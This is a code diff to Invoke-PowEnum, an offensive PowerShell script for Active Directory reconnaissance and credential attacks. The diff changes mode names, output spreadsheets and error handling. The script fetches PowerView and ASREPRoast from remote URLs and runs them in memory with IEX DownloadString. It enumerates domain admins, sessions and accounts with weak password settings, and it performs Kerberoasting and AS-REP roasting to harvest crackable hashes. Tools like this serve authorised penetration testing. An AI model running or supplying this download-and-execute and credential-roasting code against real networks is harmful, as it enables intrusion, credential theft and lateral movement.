@@ -27,8 +27,11 @@ function Invoke-PowEnum
 		
 	.PARAMETER Mode
 	
-		DCOnly: Basic Enumeration
-		Hunting: Admin Enumeration and User Hunting
+		Basic: Basic Enumeration:
+				UsersAndGroups Speadsheet
+					Domain Admins, Enterprise Admins, Built-In Admins, DC Local Admins, All Domain Users, All Domain Groups
+				HostsAndSessions Spreadsheet
+					All [DC Aware] Net Sessions, Domain Controller, Domain Computer IPs, Domain Computers, Subnets, DNSRecords, WinRM Enabled Hosts
 		Roasting: Kerberoast and ASREPRoast
 		LargeEnv: Basic Enumeration without Get-DomainUser/Group/Computer
 		Special: Enumerates Users With Specific Account Attributes:
@@ -38,14 +41,20 @@ function Invoke-PowEnum
 			Enabled, Password Doesn't Expire & Not Required
 			Enabled, Smartcard Required
 			Enabled, Smartcard Required, Password Not Required
-			Enabled, Smartcard Required, Password Doesn't Expir
+			Enabled, Smartcard Required, Password Doesn't Expire
 		
 	.EXAMPLE 
 		
 		PS C:\> Invoke-PowEnum
 		
-		Default mode (DCOnly) only communicates with the DC(s) on the local domain
+		Basic enumeration only using current domain and credential. Grabs PowerView from github.
 	
+	.EXAMPLE	
+		
+		PS C:\> Invoke-PowEnum -URL http://10.0.0.10/PowerView.ps1
+		
+		Perform basic enumeration for a specific domain using PowerView at the set URL
+		
 	.EXAMPLE	
 		
 		PS C:\> Invoke-PowEnum -Domain test.com
@@ -78,7 +87,7 @@ Param(
 
 	[Parameter(Position = 2)]
     [String]
-    $url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1",
+    $URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1",
 	
 	[Parameter(ParameterSetName = 'Credential')]
     [Management.Automation.PSCredential]
@@ -96,15 +105,15 @@ $stopwatch = [system.diagnostics.stopwatch]::startnew()
 #Download PowerView from specified URL or from GitHub.
 try {
     if (Test-Path .\PowerView.ps1){
-	    Write-Host "Skipping Download: Powervew.ps1 Present"
+	    Write-Host "Skipping Download: PowerView.ps1 present"
         Import-Module .\PowerView.ps1    
 	}
 	else {	
         $webclient = New-Object System.Net.WebClient
         $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
         Write-Host "Downloading Powerview:" -ForegroundColor Cyan
-        Write-Host "$url | " -NoNewLine
-        IEX $webclient.DownloadString($url)
+        Write-Host "$URL | " -NoNewLine
+        IEX $webclient.DownloadString($URL)
         Write-Host "Success" -ForegroundColor Green
     }
 }catch {Write-Host "Error" -ForegroundColor Red; Return}
@@ -118,7 +127,7 @@ if ($Credential -ne $null){
 	Write-Host "Impersonate user:$Domain\$Username | " -NoNewLine
 	Invoke-UserImpersonation -Credential $Credential -WarningAction silentlyContinue | Out-Null
 	Write-Host "Success" -ForegroundColor Green 
-	}catch{Write-Host "Error" -ForegroundColor; Return}
+	}catch{Write-Host "Error" -ForegroundColor Red; Return}
 	
 }	
 	
@@ -128,7 +137,9 @@ $NetworkCredential = $Credential.GetNetworkCredential()
 $Domain = $NetworkCredential.Domain
 }
 elseif (!$domain -and !$Credential) {$domain = (Get-Domain).Name}
-Write-Host "Enumeration Domain: $domain" -ForegroundColor Cyan
+
+if (!$domain) {Write-Host "Unable to retrieve domain, exiting..." -ForegroundColor Red; Return}
+else {Write-Host "Enumeration Domain: $domain" -ForegroundColor Cyan}
 
 #Supprese Errors and Warnings
 $ErrorActionPreference = 'Continue'
@@ -149,7 +160,7 @@ if ($Mode -eq 'DCOnly') {
     PowEnum-DCLocalAdmins
 	PowEnum-Users
 	PowEnum-Groups
-	PowEnum-ExcelFile -SpreadsheetName DCOnly-UsersAndGroups
+	PowEnum-ExcelFile -SpreadsheetName Basic-UsersAndGroups
 	
 	$script:ExportSheetCount = 1
 	$script:ExportSheetFileArray = @()
@@ -160,30 +171,37 @@ if ($Mode -eq 'DCOnly') {
 	PowEnum-Subnets
 	PowEnum-DNSRecords
     PowEnum-WinRM
-	PowEnum-ExcelFile -SpreadsheetName DCOnly-ComputersAndSessions
+	PowEnum-ExcelFile -SpreadsheetName Basic-HostsAndSessions
 }
 elseif ($Mode -eq 'Roasting') {
 	PowEnum-Kerberoast
     $webclient = New-Object System.Net.WebClient
     $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-    $url = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1"
+    $URL = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1"
     Write-Host "Downloading ASREPRoast:" -ForegroundColor Cyan
-    Write-Host "$url"
-    IEX $webclient.DownloadString($url)
+    Write-Host "$URL"
+    IEX $webclient.DownloadString($URL)
 	PowEnum-ASREPRoast
 	PowEnum-ExcelFile -SpreadsheetName Roasting
 }
 elseif ($Mode -eq 'LargeEnv') {
 	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
-	PowEnum-DCs
+	$script:ExportSheetCount = 1
+	$script:ExportSheetFileArray = @()
 	PowEnum-DAs
 	PowEnum-EAs
 	PowEnum-BltAdmins
-	PowEnum-IPs
+    PowEnum-DCLocalAdmins
+	PowEnum-ExcelFile -SpreadsheetName Large-Users
+	
+	$script:ExportSheetCount = 1
+	$script:ExportSheetFileArray = @()
+	PowEnum-NetSess
+	PowEnum-DCs
 	PowEnum-Subnets
 	PowEnum-DNSRecords
-	PowEnum-NetSess
-	PowEnum-ExcelFile -SpreadsheetName LargeEnvironment
+    PowEnum-WinRM
+	PowEnum-ExcelFile -SpreadsheetName Large-HostsAndSessions
 }
 elseif ($Mode -eq 'Special') {
 	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
